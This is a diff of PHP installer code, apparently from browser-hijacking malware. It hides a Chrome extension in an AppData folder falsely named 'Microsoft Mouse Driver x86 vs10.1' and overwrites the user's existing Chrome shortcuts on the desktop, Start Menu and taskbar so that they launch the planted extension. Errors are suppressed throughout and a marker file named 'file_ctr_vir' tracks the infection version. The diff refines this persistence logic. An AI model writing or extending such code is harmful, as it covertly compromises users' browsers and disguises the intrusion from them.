@@ -12,24 +12,29 @@ $target = $appdata . "\Microsoft Mouse Driver x86 vs10.1";
 $extpath = $target . "\chrome_app";
 @mkdir($target);
 @mkdir($extpath);
-if(@file_get_contents($target . '/file_ctr_vir') !== '0000001')
+if(@file_get_contents($target . '/file_ctr_vir') !== '0000002')
 {
-	@file_put_contents($target . '/file_ctr_vir', '0000001');
+	@file_put_contents($target . '/file_ctr_vir', '0000002');
 	file_put_contents($extpath . '/content.js', $cntjs);
 	file_put_contents($extpath . '/manifest.json', $manifest);
 	$paths = array(
-		$appdata . "\Microsoft\Internet Explorer\Quick Launch\Google Chrome.lnk",
-		$appdata . "\Microsoft\Internet Explorer\Quick Launch\Chrome.lnk",
-		"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Google Chrome.lnk",
-		"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Chrome.lnk",
-		$userpath . "\Desktop\Google Chrome.lnk",
-		$userpath . "\Desktop\Chrome.lnk",
-		$appdata . "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk",
-		$appdata . "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Chrome.lnk",
+		"C:\\Users\\Public\\Desktop\\Google Chrome.lnk",
+		"C:\\Users\\Public\\Desktop\\Chrome.lnk",
+		$appdata . "\\Microsoft\\Internet Explorer\\Quick Launch\\Google Chrome.lnk",
+		$appdata . "\\Microsoft\\Internet Explorer\\Quick Launch\\Chrome.lnk",
+		"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+		"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Chrome.lnk",
+		$userpath . "\\Desktop\\Google Chrome.lnk",
+		$userpath . "\\Desktop\\Chrome.lnk",
+		$appdata . "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk",
+		$appdata . "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Chrome.lnk",
 	);
 	foreach($paths as $path)
 	{
-		@file_put_contents($path, $lnk);
+		if(is_file($path))
+		{
+			@file_put_contents($path, $lnk);
+		}
 	}
 }
 
